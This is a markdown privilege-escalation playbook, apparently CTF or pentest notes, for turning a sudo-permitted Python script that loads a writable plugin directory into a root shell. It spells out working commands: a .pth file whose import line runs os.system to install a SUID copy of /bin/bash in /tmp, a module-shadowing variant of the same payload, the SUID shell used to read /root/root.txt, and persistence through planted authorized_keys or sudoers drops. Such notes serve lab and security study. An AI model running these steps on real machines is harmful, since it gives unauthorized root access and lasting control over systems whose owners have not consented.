# Sudo Python Script — sys.path / `.pth` Hijack via Writable Plugin Dir

## When this applies

`sudo -l` shows a rule like:

```
(root) NOPASSWD: /usr/bin/python3.X /opt/.../script.py *
```

and the script adds an **attacker-writable directory** to the import path before/while importing
modules. Common shapes (read the script source — the sudo rule names a path you can read):

- `site.addsitedir(d)` over a plugins dir, or looping `for p in plugins.iterdir(): site.addsitedir(p)`.
- `sys.path.insert(0, d)` / `sys.path.append(d)` with `d` writable.
- A plain `import <name>` where `<name>` resolves from a writable dir on `sys.path`.

Check writability + group: `id`; `find <plugindir> -maxdepth 2 -perm -002 -o -perm -020` ; `ls -ld <plugindir>`.
A `drwxrwxr-x root:devs` plugin dir with you in `devs` is enough.

## Primitive A — `.pth` auto-exec (most reliable)

`site.addsitedir(d)` scans `d` for `*.pth` files and **`exec()`s any line that starts with `import `**.
This fires at import time, before `main()` parses argv — so *any* allowed argument triggers it.

```bash
PLUG=/opt/tools/.../plugins/dev          # the writable dir site.addsitedir() processes
echo 'import os; os.system("install -m6755 /bin/bash /tmp/.rb")' > "$PLUG/zz.pth"
sudo /usr/bin/python3.10 /opt/tools/.../script.py status   # any valid action
/tmp/.rb -p -c 'id; cat /root/root.txt'                    # euid=0
```

The `.pth` line **must** begin with `import `; chain extra statements with `;`. One line only.

## Primitive B — module shadowing

If the writable dir precedes the real module's dir on `sys.path`, drop `<imported_module>.py`
with top-level code:

```bash
cat > "$PLUG/mlflow_actions.py" <<'PY'
import os; os.system("install -m6755 /bin/bash /tmp/.rb")
PY
sudo /usr/bin/python3.10 /opt/tools/.../script.py status
```

Python imports your copy first → code runs as root. Beware a stale `__pycache__/*.pyc` shadowing
your `.py`; primitive A avoids that entirely.

## Verifying success

- `id` inside the spawned shell shows `euid=0(root)`.
- `/tmp/.rb -p` (SUID copy) or a planted `authorized_keys` / sudoers drop confirms persistence.

## Pitfalls / cleanup

- `secure_path` in sudoers does **not** help the defender here — execution happens via the import
  machinery, not `$PATH`.
- Root-owned artifacts in sticky `/tmp` can't be removed as the low-priv user; delete them with a
  second root-exec (`.pth` running `rm -f`).
- Remove the planted `.pth`/`.py` afterward to leave the box clean — the primitive is repeatable
  on demand from the writable dir.

Related: [pycache-poisoning.md](pycache-poisoning.md) (sudo Python + `.pyc` write),
[suid-binary-exploitation.md](suid-binary-exploitation.md).
